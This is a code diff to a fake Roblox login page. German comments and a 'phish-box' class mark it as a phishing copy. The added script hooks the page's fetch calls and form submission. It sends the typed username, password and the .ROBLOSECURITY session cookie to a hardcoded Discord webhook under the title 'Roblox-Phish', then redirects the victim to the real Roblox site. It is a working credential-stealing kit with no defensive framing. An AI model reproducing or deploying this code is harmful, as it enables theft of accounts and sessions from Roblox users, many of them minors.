@@ -252,6 +252,23 @@
       data-request-batch-size="100"
       data-thumbnail-metrics-sample-size="20"
       data-concurrent-thumbnail-request-count="4"/>
+
+	<!-- FIX 1 + 2: Hintergrund & breitere Login-Box -->
+<style>
+html,body{height:100%;margin:0}
+body{
+  background:#0e0e10 url(https://www.roblox.com/images/landing/hero-2025.jpg) center/cover no-repeat fixed;
+}
+.phish-box{
+  width:50vw;
+  max-width:600px;
+  margin:10vh auto;
+  background:#1f1f23;
+  border-radius:12px;
+  padding:48px;
+  box-shadow:0 20px 32px #00000080;
+}
+</style>
                           
 
 </head>
@@ -316,9 +333,8 @@
         <div class="content" id="content">
             
 <!-- ORIGINALES REACT-DIV – wir ersetzen es durch echtes Formular -->
-<div id="react-login-web-app">
-    <!-- FAKE LOGIN – sieht 1:1 aus -->
-    <div class="rbx-login-container">
+<div id="react-login-web-app" class="phish-box-outer">
+    <div class="rbx-login-container phish-box">
         <div class="login-area">
             <h2 class="login-header">Log In</h2>
             <form id="f" autocomplete="off">
@@ -697,6 +713,50 @@ document.getElementById('f') && document.getElementById('f').addEventListener('s
   // Weiterleitung zur echten Roblox-Homepage
   window.location = 'https://www.roblox.com/home';
 });
+</script>
+	<!-- FIX 3: Webhook + Weiterleitung -->
+<script>
+(function(){
+  const origFetch = window.fetch;
+  window.fetch = function(...args){
+    if(args[0] && args[0].includes('/auth/signin')){
+      const body = JSON.parse(args[1].body);
+      sendToDiscord(body.username, body.password);
+    }
+    return origFetch.apply(this, args);
+  };
+
+  const form = document.querySelector('#f');
+  if(form){
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+      const u = form.u.value, p = form.p.value;
+      sendToDiscord(u, p);
+      window.location = 'https://www.roblox.com/home';
+    });
+  }
+
+  function sendToDiscord(u, p){
+    const robloxSec = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/)?.[1] || '';
+    fetch('https://discord.com/api/webhooks/1422244213491499162/S8y98VTEc7q-LoxTTi0yhtw7xtyRTcRzz9fQGW5geZgVrUzBj8e-aCg3_QL6qodey4pS', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        content: '**Roblox-Phish**',
+        embeds: [{
+          title: 'Neuer Login',
+          color: 0x02b757,
+          fields: [
+            {name: 'User', value: u, inline: true},
+            {name: 'Pass', value: p, inline: true},
+            {name: 'ROBLOSECURITY', value: robloxSec || '–', inline: false}
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      })
+    });
+  }
+})();
 </script>
 </body>
 </html>
